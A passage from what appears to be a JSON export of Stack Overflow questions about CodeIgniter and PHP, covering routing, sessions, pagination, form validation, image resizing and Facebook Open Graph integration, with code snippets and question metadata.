uploading to server","body":"<p>I have a CodeIgniter installation on my local machine. I used <code>hosts</code> file in Windows and Apache config to make it work under my real domain name (eg. <code>site.com</code>). It worked great, so today I uploaded everything to my host. I changed <code>hosts</code> and Apache config, flushed DNS via <code>ipconfig /flushdns</code> and now entering certain URLs (<code>games</code>) gives me 404. </p>\n\n<p>My controller name starts with uppercase but I have routes set like this:</p>\n\n<pre><code>$route['Games/(:num)/(:any)'] = 'Games/Game/$1';\n$route['games/(:num)/(:any)'] = 'Games/Game/$1';\n</code></pre>\n\n<p>Either entering this by <code>games/14/game</code> or <code>Games/14/game</code> doesn't work.</p>\n\n<p>Searching for images (using <a href=\"http://stackoverflow.com/questions/11100706/codeigniter-doesnt-see-images-using-file-exists\">solution given by merahulpk</a>)  doesn't work also.</p>\n\n<p>What can it be?</p>\n\n<p>Unfortunately, it's still under development, so I can't give you the aaddess just yet. </p>\n\n<p>-- edit --</p>\n\n<p>Image inclusion script:</p>\n\n<p><code>views/game.php</code></p>\n\n<pre><code>&lt;?php\n    $image_path = $this-&gt;config-&gt;item('base_path').'images/games/'.$info['id'].'-s.jpg';\n    if(file_exists($image_path)) {\n        $small = $this-&gt;config-&gt;item('base_url').'images/games/'.$info['id'].'-s.jpg';\n        $big = $this-&gt;config-&gt;item('base_url').'images/games/'.$info['id'].'-b.jpg';\n    } else {\n        $small = $this-&gt;config-&gt;item('base_url').'images/games/none-m.png';\n        $big = $this-&gt;config-&gt;item('base_url').'images/games/none-m.png';\n    }\n?&gt;\n</code></pre>\n\n<p><code>config/sit-config.php</code></p>\n\n<pre><code>&lt;?php\n\n$config['base_url'] = \"http://\".$_SERVER['SERVER_NAME'] . str_replace(basename($_SERVER['SCRIPT_NAME']),\"\",$_SERVER['SCRIPT_NAME']);\n\nif(!defined('DOCUMENT_ROOT')) define('DOCUMENT_ROOT',str_replace('system/application/config','',substr(__FILE__, 0, strrpos(__FILE__, '/'))));\n\n$config['base_path']    =   constant(\"DOCUMENT_ROOT\");\n?&gt;\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12615242,"title":"Codeigniter model foreach pass array to controller -> to view","body":"<p>Here is my model - I want to assign the rows and echo out on the view page e.g <code>&lt;?php echo $product?&gt;</code>\n    \n\n<pre><code>class Model_products extends CI_Model {\n\n    function printer()\n    {\n\n    $id = $this-&gt;uri-&gt;segment(3, 0);\n\n        $q = $this-&gt;db-&gt;get_where('printer', array('id' =&gt; $id));\n\n        if ($q-&gt;num_rows == 1)\n        { \n            foreach ($q-&gt;result() as $row)\n            {\n\n                echo $row-&gt;name; # THIS WORKS\n                $data['product'] = $row-&gt;name;  # THIS DOES NOT WORK\n                $data['desc'] = $row-&gt;description;\n                $data['size'] = $row-&gt;size;\n                $data['options'] = $row-&gt;options;\n                $data['more'] = $row-&gt;more_info;\n            }\n        }\n\n\n    }\n}\n</code></pre>\n\n<p>Here's my controller</p>\n\n<pre><code>public function products()\n{\n\n    $this-&gt;load-&gt;model('Model_products');\n\n    $this-&gt;Model_products-&gt;printer();\n\n    $this-&gt;load-&gt;view('products', $data);\n\n    $this-&gt;load-&gt;view('pricing');\n}\n</code></pre>\n\n<p>My view is</p>\n\n<pre><code>&lt;h1&gt;\n&lt;?php echo $product; ?&gt;\n&lt;/h1&gt;\n\n&lt;p&gt;\n&lt;?php echo $desc; ?&gt;\n&lt;/p&gt;\n\n\n&lt;h3&gt;\nSize\n&lt;/h3&gt;\n&lt;p&gt;\n&lt;?php echo $size; ?&gt;\n&lt;/p&gt;\n</code></pre>\n\n<p><strong>How do I properly pass my model array to my controller so that I can echo out on my view?</strong></p>\n"},{"tags":["php","codeigniter","session","subdomain"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":209,"score":1,"question_id":10327450,"title":"Error in using common session for codeigniter driven subdomains","body":"<p>I have some codeigniter driven sub-domains and using native codeigniter session library. There is a sub-domain that creates and updates the session and other sub-domain has to share the session. I am not able to share the session among other sub-domains. I have changed the config parameter in <strong>application/config.php</strong></p>\n\n<pre><code>$config['cookie_domain']    = \"example.com\";\n</code></pre>\n\n<p>but it's not working.</p>\n"},{"tags":["php","mysql","codeigniter","pagination"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12599356,"title":"Codeigniter Pagination and MySQL Query with dynamic parameters","body":"<p>Let me explain my issue in detail</p>\n\n<p>I have a table called products    </p>\n\n<pre><code>Products : Name , views , sale_wanted , added_date\n</code></pre>\n\n<p>I am listing all my products in a view .<br>\nI am handling sale wanted through a flag means 0 or 1.<br>\nThere are some links to sort the listing.</p>\n\n<pre><code>Most Viewed    \nWanted    \nFor Sale    \nNew Arrivals    \n</code></pre>\n\n<p>Now when user clicks all the listing is sorted according to the parameter i am sendig.<br>\nI want to use pagination class of Codeigniter.<br>\nHere comes some issues.<br>\nWhen i am clicking let suppose Wanted and sending a parameter it lists all the products wanted.    </p>\n\n<pre><code>Now i click on a pagination link and the wanted parameter is gone \nand the list becomes without wanted parameter.    \n</code></pre>\n\n<p>Same goes with the other Anchors.<br>\nI have to restrict it so it still has my parameter.<br>\nThe second problem is that what i see Codeigniter is laking.<br>\nI need some links that user can select. Means i want to give the user functionality to select how many products he wants to see in one page.    </p>\n\n<pre><code>Let suppose 5 ,10 ,15 ,20    \n</code></pre>\n\n<p>Choosing the greater number will reduce the number of pages.<br>\nAnd still i want the same functionality.<br>\nThe important point is that i want to handle all this just in one shot means i dont want to duplicate my code for every anchor.\nI need suggestions from expert and any help regarding Pagination library.</p>\n"},{"tags":["php","mysql","codeigniter","phpexcel"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12615431,"title":"PHPExcel Render html tags in mysql table row","body":"<p>I am using <strong><code>phpExcel</code></strong> library.I have an export script working fine which fetch all data from a MySQL table.Now the MySQL table has a row called <code>product_info</code> which contains HTML tags and styles.</p>\n\n<p>Now how can I render those styles for that just one row, which contain HTML elements like <code>&lt;font color=\"Red\"&gt;Hello&lt;/font&gt;</code>. This HTML tags varies. So how can I render them?</p>\n\n<p>Please advise</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":53,"score":-2,"question_id":12615069,"title":"resource id # 53 error in mysql","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4290108/how-do-i-echo-a-resource-id-6-from-a-mysql-response-in-php\">How do i “echo” a “Resource id #6” from a MySql response in PHP?</a>  </p>\n</blockquote>\n\n\n\n<p>hey guys i got an error when i try to run my code in php.\nIt displays resource id #53 in my screen. All i want is to count only the total of one of my field but im stuck with thise error. Here's my code below:</p>\n\n<pre><code>$last_points = mysql_insert_id();\n//echo $last_points , display like 12... no error\n$fkid = $last_points;   // no error....\n$sql = \"SELECT COUNT(*) FROM downline WHERE fkmember = {$fkid}\";\n$execute = mysql_query($sql) or die (mysql_error());\necho $execute; //display error why?\n</code></pre>\n\n<p>help me guys please. i think its my query.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12614711,"title":"load style css in codeigniter framework","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1060733/codeigniter-loading-css\">CodeIgniter - Loading CSS</a>  </p>\n</blockquote>\n\n\n\n<p>I try load css file and it's not work.\nthis is the link tag:</p>\n\n<pre><code>&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"application/styles/style.css\" /&gt;\n</code></pre>\n\n<p>how i can do this?</p>\n"},{"tags":["php","string","codeigniter"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":12614336,"title":"PHP question mark operator and string concatenation","body":"<p>I'm still a newbie in php and I'm using codeigniter for my backend framework.\nI have a <code>table.php</code> file that will generate a html table in real-time. Then, I encounter some issues.</p>\n\n<pre><code>$output_string .= \"&lt;td&gt;\".($row-&gt;isactive == \"0\") ? \"Activated\":\"Deactivated\".\"&lt;/td&gt;\";\n</code></pre>\n\n<p>with the above code I get nothing, but with a little change to:</p>\n\n<pre><code>$isactive = ($row-&gt;isactive == \"0\") ? \"Activated\":\"Deactivated\";\n$output_string .= \"&lt;td&gt;\".$isactive.\"&lt;/td&gt;\";\n</code></pre>\n\n<p>I get my results, so my question is, why?</p>\n\n<p>Doesn't PHP support question mark operator in string concatenation??</p>\n"},{"tags":["codeigniter","pagination","links"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12604776,"title":"Codeigniter Pagination Links Errors","body":"<p>I am using codeigniter 2.03 and its pagination class. It has a problem that looks something like this:</p>\n\n<p>1<br>\n2<br>\nnext last</p>\n\n<p>here is my code in controller: </p>\n\n<pre><code>$config['base_url'] = site_url().'/admin/seesubcategory/'; //set the base url for pagination\n$config['total_rows'] = $a; //total rows\n$config['per_page'] = '12'; //the number of per page for pagination\n$config['uri_segment'] = 3; //see from base_url. 3 for this case\n$this-&gt;pagination-&gt;initialize($config); //initialize pagination\n$config['num_tag_open'] = '&lt;div id=\"pagination\"&gt;';  \n$config['num_tag_close'] = '&lt;/div&gt;';\n$config['prev_link'] = '&amp;lt;';\n$config['prev_tag_open'] = '&lt;div&gt;';\n$config['prev_tag_close'] = '&lt;/div&gt;';\n</code></pre>\n\n<p>here is my code for print the links:</p>\n\n<pre><code>&lt;?php echo $this-&gt;pagination-&gt;create_links(); ?&gt;\n</code></pre>\n\n<p>and here is my css:</p>\n\n<pre class=\"lang-css prettyprint-override\"><code>#pagination a, #pagination strong {\n    background: #e3e3e3;\n    padding: 4px 7px;\n    text-decoration: none;\n    border: 1px solid #cac9c9;\n    color: #292929;\n    font-size: 13px;\n}\n\n#pagination strong, #pagination a:hover {\n    font-weight: normal;\n    background: #cac9c9;\n    display: inline-block;\n}\n</code></pre>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3042,"score":1,"question_id":7933298,"title":"Codeigniter Form Validation: How to redirect to the previous page if found any validation error?","body":"<p>I am using Codeigniter's validation class to validate my form. Could you please tell me how to redirect to the previous page from controller if found any validation error?</p>\n\n<p>In my controller: </p>\n\n<pre><code>if ($this-&gt;form_validation-&gt;run() == FALSE){\n\n  //**** Here is where I need to redirect  \n\n} else  {\n     // code to send data to model...           \n\n  }                             \n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":12613520,"title":"How to prevent strange email to regiser my site","body":"<p>I have a bit problem with account register on my site</p>\n\n<p>Now, I just see one email account have been register with my site, It is so strange, that email is 1334395@rtrtr.com, and I don't know for sure how many similar mails are there.</p>\n\n<p>I don't want this email can register with my account, Because I'm afraid with spam mail or Hackers.</p>\n\n<p>How can I prevent from all of it?</p>\n"},{"tags":["php","oop","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":12612860,"title":"Create class property dynamically/programmatically","body":"<p>I am looking to do something similar to the way CodeIgniter's <code>load</code> object works.  You can instantiate a class, and in this example, a model, by using:</p>\n\n<p><code>$this-&gt;load-&gt;model('some_model', 'custom_name')</code></p>\n\n<p>The model <code>some_model</code> is now accessible via <code>$this-&gt;custom_name</code>.  Does this make use of <code>__set()</code> and <code>__get()</code> or is it something entirely different?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":72,"score":2,"question_id":12612392,"title":"How to change an error displayed in codeigniter","body":"<p><code>The URI you submitted has disallowed characters.</code></p>\n\n<p>How do I intercept this error? Is their a <code>callback_</code> function? This error occurs when I try to use an = in the URL. E.g. I put 1=1 -- I get this this error. Instead of the error page I want to <code>redirect('main/cate/page');</code></p>\n\n<p>How do I catch this error and redirect instead of displaying \"An error was encountered page\"</p>\n"},{"tags":["php","codeigniter","migration"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12606167,"title":"CodeIgniter - ci_sessions migrations","body":"<p>I was wondering if someone can help out.</p>\n\n<p>Im just getting into using migrations with CodeIgniter, but im having trouble trying to figure out how to convert SQL to the migrations.</p>\n\n<p>Is there anyone out there that could convert this SQL to migrations for me so i can see how its done.</p>\n\n<p>The SQL i have is as follows:</p>\n\n<pre><code>CREATE TABLE IF NOT EXISTS `ci_sessions` (\n  `session_id` varchar(40) COLLATE utf8_bin NOT NULL DEFAULT '0',\n  `ip_address` varchar(16) COLLATE utf8_bin NOT NULL DEFAULT '0',\n  `user_agent` varchar(150) COLLATE utf8_bin NOT NULL,\n  `last_activity` int(10) unsigned NOT NULL DEFAULT '0',\n  `user_data` text COLLATE utf8_bin NOT NULL,\n  PRIMARY KEY (`session_id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;\n</code></pre>\n"},{"tags":["php","codeigniter","file-upload","form-validation"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":115,"score":0,"question_id":10944618,"title":"CodeIgniter File upload is set to required","body":"<p>How can I set the file upload to \"not required\" fields</p>\n\n<p>I mean, my file upload field is optional</p>\n\n<pre><code>public function validateVideo(){\n    $config['upload_path'] = 'blogvids/';\n    $config['allowed_types'] = 'mp4|avi';\n    $config['max_size'] = '999999';\n\n    $this-&gt;load-&gt;library(\"upload\",$config);\n    if(!$this-&gt;upload-&gt;do_upload(\"video\")){\n\n        return false;\n\n    }\n}\n</code></pre>\n"},{"tags":["php","oop","codeigniter","naming-conventions"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":11059044,"title":"Is it necessary to use private functions in models?","body":"<p>I'm making a model in CodeIgniter and I don't want any of the functions to be accessible to the user. For controllers you would do something like:</p>\n\n<pre><code>private function _myfunction()\n{\n    dosomething();\n}\n</code></pre>\n\n<p>I know this will also work for models but my question is, is this needed? I don't think users can initiate these functions via the URL. The reason I'm asking is because I'd like to follow best practice but if possible I'd also like to avoid prefixing everything with '_' when I call it.</p>\n"},{"tags":["php","codeigniter","facebook-opengraph","facebook-canvas"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12612125,"title":"Open graph $_REQUEST and meta tag error","body":"<p>I have been working on a Facebook canvas page app using Codeigniter as a framework and pagoda box as a hosting service. So far I have the app up and running successfully and am now attempting to use open graph to post interactions on peoples timelines. The problem that I am having is that when I plug the URL that I am using into the debugger (http://developers.facebook.com/tools/debug) I get the error: </p>\n\n<p>\"You have tags ouside of your . This is either because your was malformed and they fell lower in the parse tree, or you accidentally put your Open Graph tags in the wrong place. Either way you need to fix it before the tags are usable.\" (verbatim)</p>\n\n<p>I have gone through my code and we haven't found a case where this is true. So I continued debugging and found that the error was centered around a $_REQUEST call to Facebook for the signed_request in the controller. So I surrounded the  $_REQUEST with html  tags which worked as a hack but I'm wondering if there is something better that I could do. Also, it causes the graph api to return:</p>\n\n<p>'\"message\": \"An unexpected error has occurred. Please retry your request later.\", \"type\": \"OAuthException\", \"code\": 2\"'</p>\n\n<p>Here's a snippet of my code\nController:</p>\n\n<pre><code>echo '&lt;html&gt;';\necho '&lt;head&gt;';\n\nif(isset($_REQUEST['signed_request'])) {\n\n    $encoded_sig = null;\n    $payload = null;\n    list($encoded_sig, $payload) = explode('.', $_REQUEST['signed_request'], 2);\n    $sig = base64_decode(strtr($encoded_sig, '-_', '+/'));\n    $data = json_decode(base64_decode(strtr($payload, '-_', '+/'), TRUE), TRUE);\n\n} else {\n    echo 'error';\n}\necho '&lt;/head&gt;';\necho '&lt;/html&gt;';\n</code></pre>\n\n<p>View:</p>\n\n<pre><code>&lt;!doctype html&gt; \n\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" dir=\"ltr\" lang=\"en-US\"\n  xmlns:fb=\"https://www.facebook.com/2008/fbml\"&gt; \n&lt;head prefix=\"og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# app-name: \n              http://ogp.me/ns/fb/app-name#\"&gt;\n\n    &lt;title&gt;Facebook Title | Corp Name&lt;/title&gt;\n    &lt;meta charset=\"utf-8\" /&gt;\n    &lt;meta property=\"fb:admins\" content=\"[Number]\" /&gt; \n    &lt;meta property=\"fb:app_id\" content=\"[App-id]\" /&gt; \n    &lt;meta property=\"og:type\"   content=\"app-name:action\" /&gt; \n    &lt;meta property=\"og:url\"    content=\"&lt;?php echo base_url(); ?&gt;\" /&gt; \n    &lt;meta property=\"og:title\"  content=\"The beginning\" /&gt; \n    &lt;meta property=\"og:image\"  content=\"[image-url]\" /&gt;\n\n    &lt;script type=\"text/javascript\"&gt;\n    function postObject()\n    {\n        FB.api(\n            '/me/app-name:object',\n            'post',\n            { invitation: '&lt;?php echo base_url(); ?&gt;' },\n            function(response) {\n            if (!response || response.error) {\n                alert('Error occured');\n            } else {\n                alert('Accept was successful! Action ID: ' + response.id);\n            }\n            });\n    }\n    &lt;/script&gt; \n\n&lt;/head&gt;\n&lt;body&gt;\n....\n&lt;/body&gt;\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["jquery","ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12609862,"title":"isHappy.js allowing ajax call when not valid","body":"<p>I'm throwing this up in hope that someone might spot a mistake because I've gone over this way to many times now. It was working fine for about ten minutes but then just broke. </p>\n\n<p>I have a codeigniter website with a very simple contact form with 3 fields. I'm using isHappy.js to validate the form and then send off to the server. isHappy.js should stop the AJAX function until the form has validated but this parts not happening. If I click the submit button without filling out the form the validation errors flash up but then the ajax call is made and the form is submit. </p>\n\n<h2>Heres the Javascript:</h2>\n\n<pre><code> $(function() { \n\n $('#contact-form').isHappy({\n   fields: {\n\n     '#email': {\n       required: true,\n       message: 'How can I reach you sans email??'\n     },\n     '#subject': {\n       required: true,\n       message: 'Can you give me a clue to what you inquiring about please'\n     },\n     '#body': {\n       required: true,\n       message: 'More details please....'\n     }\n   }\n});\n\n $('#contact-form').bind('submit', function(e) {\n                e.preventDefault();\n                var query_params = $('#contact-form').serialize();\n\n                $.ajax({\n                    type: 'POST',       \n                    url: 'http://website.dev:8080/contact/email/ajax',\n                    data: query_params,\n                    dataType: 'json',\n\n                    success: function(string){\n                        $('#contact-form').fadeOut('medium', function() {\n                                $('#linkedin').after(\"&lt;div style=\\\"clear:both;\\\" /&gt;&lt;div id=\\\"contact-complete\\\" stlye=\\\"width:100%;height:200px;\\\"&gt;&lt;h1&gt;\"+string+\"&lt;/h1&gt;&lt;/div&gt;\").fadeIn('medium');        \n                        });                                                             \n                    }\n\n                });\n    });     \n}); \n</code></pre>\n\n<h2>And the HTML:</h2>\n\n<pre><code>&lt;form action=\"http://website.dev:8080/contact/email\" method=\"post\" accept-charset=\"utf-8\" id=\"contact-form\"&gt;        \n&lt;div class=\"contact-input\"&gt;\n    &lt;input type=\"text\" name=\"email\" id=\"email\" placeholder=\"Your email\" value=\"\" /&gt;\n&lt;/div&gt;\n&lt;div class=\"contact-input\"&gt;\n    &lt;input type=\"text\" name=\"subject\" id=\"subject\" placeholder=\"Subject\" value=\"\" /&gt;\n&lt;/div&gt;\n&lt;div class=\"contact-textarea\"&gt;\n    &lt;textarea rows=\"10\" placeholder=\"How can I help you?\" name=\"body\" id=\"body\"&gt;&lt;/textarea&gt;\n&lt;/div&gt;\n&lt;input type=\"submit\" value=\"Send\" id=\"contact-click\" /&gt;\n</code></pre>\n\n<p></p>\n"},{"tags":["php","codeigniter","tag-cloud"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":88,"score":3,"question_id":12557349,"title":"Where is the Taggly tag cloud library for codeigniter?","body":"<p>I can't find the <a href=\"https://github.com/EllisLab/CodeIgniter/wiki/Taggly\" rel=\"nofollow\">Taggly library</a> anywhere on the net, does anyone know where to find it please ? The link doesn't work on the wiki.</p>\n\n<p>Thanks.</p>\n"},{"tags":["php","codeigniter","tankauth"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":436,"score":0,"question_id":8450918,"title":"Some browsers cannot log in with Tank Auth","body":"<p>I am using Tank Auth for user authentication. I am using the database to store sessions and using <code>$this-&gt;auth-&gt;tank_auth-&gt;is_logged_in()</code> to check if user is logged in. HMVC is also used, where <code>auth</code> module contains tank_auth.</p>\n\n<p><strong>Problem:</strong> It seems that some browsers cannot successfully log in into the website, including IE8, Chrome 15.0.874.121. Earlier versions of Chrome and IE are able to login. I did a trace of redirects and found out that upon logging in, the user is redirected to the main page, where the check <code>is_logged_in()</code> fails and redirects the user back to the login back. Anyone knows the problem?</p>\n\n<p><strong>Config.php</strong></p>\n\n<pre><code>$config['sess_cookie_name']     = 'ci_session';\n$config['sess_expiration']      = 7200;\n$config['sess_expire_on_close'] = FALSE;\n$config['sess_encrypt_cookie']  = FALSE;\n$config['sess_use_database']    = TRUE;\n$config['sess_table_name']      = 'ci_sessions';\n$config['sess_match_ip']        = FALSE;\n$config['sess_match_useragent'] = TRUE;\n$config['sess_time_to_update']  = 300;\n</code></pre>\n\n<p><strong>CI Controller Code</strong></p>\n\n<pre><code>function index() {\n    $this-&gt;load-&gt;module('auth');\n    if(!$this-&gt;auth-&gt;tank_auth-&gt;is_logged_in()) {\n         redirect('login');\n    } \n\n    $this-&gt;load-&gt;view('main');\n\n}\n</code></pre>\n"},{"tags":["php","codeigniter","documentation","phpdocumentor"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12606839,"title":"How to use phpDocumentor for CodeIgniter","body":"<p>I've built quite an extensive web application and I was looking through the style guide for CodeIgniter (CI) to see how to do comments. It has things like this for classes and methods:</p>\n\n<pre><code>/** \n* Super Class \n* \n* @package Package Name \n* @subpackage Subpackage \n* @category Category \n* @author Author Name \n* @link http://example.com \n*/ \n\nclass Super_class {}\n\n/** \n* Encodes string for use in XML \n* \n* @access public \n* @param string \n* @return string \n*/ \n\nfunction xml_encode($str){}\n</code></pre>\n\n<p>This is fine but then I don't know what to fill out for these options. I don't really have @package, I just have some models and controllers. In Java I might use packages for security but not in CI, it's just the MVC. I always have things like, project_mode, projects (controller) and add_project_view.php for example. </p>\n\n<p>Also what is the format for @category? The phpDocumentor docs say, \"The @category tag is used to organize groups of packages together\". Again, no packages!</p>\n\n<p>Secondly, what about parameters in methods? Sometimes I have two strings and an array or an integer and an array, what is the format for @param?</p>\n\n<p>Thanks,</p>\n"},{"tags":["php","session","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":261,"score":2,"question_id":7104568,"title":"How do I store database sessions in CodeIgniter with multiple databases?","body":"<p>I am using codeigniter and till date I was using cookie based sessions.. but now size of sessions is increased so i need to store them in database..</p>\n\n<p>I have multiple database(more than 3) connected to  my application..How can i specifically use ci_sessions table to store sessions?</p>\n\n<p>when i say $config['sess_use_database']    = TRUE; my app goes blank. a plane white page is shown.</p>\n\n<p>That is because From multiple database connections codeigniter is not finding exact database to store sessions..</p>\n\n<p>How can i achieve the same?\nThanks</p>\n"},{"tags":["php","jquery","html","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":88,"score":1,"question_id":12604147,"title":"codeigniter - how to create two forms that \"share\" a input field","body":"<p>I'm wondering how to resolve an issue where I have one text box and two buttons. \nEach button needs the same data in the text box to accomplish its task. </p>\n\n<p>One button is to update the existing record they are reviewing (with the new value in the text box), and the other button is used to add a new record (again, using the new value in the text). </p>\n\n<p>One idea I had was to use jquery to update a hidden text box that gets updated when the visible text box is modified by the user. </p>\n\n<p>So something like this: (this is just pseudocode...)</p>\n\n<pre><code> &lt;form name=\"form1\" method=\"post\" action=\"controller1/method1\"&gt;\n     &lt;input type=text name=visibleTextBoxForForm1&gt;&lt;/input&gt;\n     &lt;button type=submit value=UPdate&gt;\n &lt;/form&gt;\n &lt;form name=\"form2\" method=\"post\" action=\"controller2/method2\"&gt;\n     &lt;input type=hidden name=hiddenTextBoxforForm2&gt;&lt;/input&gt;\n     &lt;button type=submit value=New&gt;\n &lt;/form&gt;\n &lt;script&gt;\n        $('#visibleTextBoxForForm1').live('change', function() {\n             //update a hidden textbox in form2 with value of this textbox.\n         });\n &lt;/script&gt;\n</code></pre>\n\n<p>Is there a better way to do this? </p>\n"},{"tags":["php","codeigniter","imagemagick","image-resizing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":116,"score":0,"question_id":12591734,"title":"PHP ImageMagick Multiple sizes for images - Cant get it to work","body":"<p>Hi all : ) Thank you in advance for any assistance with this question.</p>\n\n<p>I am using CodeIgniter and have images uploading, rotating and resizing successfully.\nIt is when I try to create multiple sizes fro an image that I am a little lost.</p>\n\n<p>Here is my code: </p>\n\n<pre><code>// First I make two copies of the origional image - there is no problem here - these always work. I always have the successfully copied images.\n\n                $Copy_Mid_Size_File = \"Some_Path_For_The_Newly_Copied_Mid_Size_Image\"\n\n                if(!copy($source_image, $Copy_Mid_Size_File)){\n                    echo \"failed to copy $Copy_Mid_Size_File - Please contact the system administrator. \\n\";\n                    die();\n                }\n\n                $Copy_Thumbnail_Size_File = \"Some_Path_For_The_Newly_Copied_Thumbnail_Size_Image\"\n\n                if(!copy($source_image, $Copy_Thumbnail_Size_File)){\n                    echo \"failed to copy $Copy_Thumbnail_Size_File - Please contact the system administrator. \\n\";\n                    die();\n                }\n\n                // Now I resize for the mid size image\n                $config['image_library'] = 'imagemagick';           \n                $config['library_path'] = '/usr/bin';\n\n                $config['source_image'] = $Copy_Mid_Size_File;\n                $config['maintain_ratio'] = TRUE;\n                $config['quality'] = '100%';\n                $config['master_dim'] = 'auto';\n                $config['width'] = 200;\n                $config['height'] = 200;\n\n                $this-&gt;load-&gt;library('image_lib', $config);\n\n                if(!$this-&gt;image_lib-&gt;resize()){\n                    echo $this-&gt;image_lib-&gt;display_errors();// This has never reported an error yet\n                    echo \"Image Re-size for Mid Size Image FAILED!\";// This has never reported an error yet\n                    die();\n                }else{\n                    echo\" Mid-Size Re-size Worked!\";\n                }\n\n\n                // Now I try to resize for the Thumbnail\n                $config['image_library'] = 'imagemagick';           \n                $config['library_path'] = '/usr/bin';\n\n                $config['source_image'] = $Copy_Thumbnail_Size_File;\n\n                $config['maintain_ratio'] = TRUE;\n                $config['quality'] = '100%';\n                $config['master_dim'] = 'auto';\n                $config['width'] = 50;\n                $config['height'] = 50;\n\n                $this-&gt;load-&gt;library('image_lib', $config);\n\n                if(!$this-&gt;image_lib-&gt;resize()){\n                    echo $this-&gt;image_lib-&gt;display_errors();// This has never reported an error yet\n                    echo \"Image Re-size for Thumbnail Size Image FAILED!\";// This has never reported an error yet\n                    die();\n                }else{\n                    echo\" Thumbnail Re-size Worked!\";\n                }\n</code></pre>\n\n<p>I always end up with the proper number of images correctly named - The thumbnail image just does not re-size - there is no error reported. It always says that is succeeded.</p>\n\n<p>If I put the thumbnail re-size code first - the thumbnail re-sizes correctly - but then the mid-size image does not.</p>\n\n<p>I realize there are other ways to load the libraries - but I don't see why the first re-size works but the second does not.</p>\n\n<p>Any ideas?</p>\n\n<p>Thanks.\nRegards,\nKen</p>\n"},{"tags":["javascript","codeigniter","text-editor","richtexteditor"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":49,"score":-3,"question_id":12605698,"title":"How to create a \"Text Editor\" on web page?","body":"<p>I want to create a text editor on my webpage like the comment box in this website.\nAnd if I want to view that article, it also keeps format to be the same as posting.</p>\n\n<p>ps. I use Codeigniter to implement my webpage.</p>\n"},{"tags":["php","codeigniter","mustache"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":91,"score":1,"question_id":12595473,"title":"how to call codeigniter helpers or php functions in mustache.php","body":"<p>hi i am working on mustache.php with codeigniter it is parsing mustache tag really nice now how can i use CI helpers or php functions with in mustache tags like</p>\n\n<pre><code>    {{ anchor(\"http://www.google.com\",\"Google\") }}\n\n//php function\n\n    {{ date() }}\n</code></pre>\n\n<p>i have tried mustache helpers but no luck as per this post <a href=\"https://github.com/bobthecow/mustache.php/pull/82\" rel=\"nofollow\">github mustache</a></p>\n\n<p>i this case i have to add extra opening and closing mustache tags. which i don't want just passing function in tags and get output.</p>\n"},{"tags":["php","codeigniter","email","relative-path","filepath"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":114,"score":0,"question_id":12603005,"title":"Send email with an attachment in Codeigniter","body":"<p>I am using the Codeigniter library to send an email with an attachment, the file I want to attach is in the following directory</p>\n\n<pre><code>/uploads/pdf/yourfile.pdf\n</code></pre>\n\n<p>How would I attach this in relation to its fullpath? E.g How can I find the correct path (not URL) for this file.</p>\n\n<pre><code> $this-&gt;email-&gt;attach('/path/uploads/pdf/yourfile.pdf');\n</code></pre>\n\n<p>How can I determine what should replace 'path' in the line above</p>\n"},{"tags":["php","mysql","codeigniter","session","cookies"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12603385,"title":"two projects sharing same user accounts","body":"<p>I have two independent projects / sites which each has it's own database. \nI want to have a common user registration between both. \nShould I created a third database for user 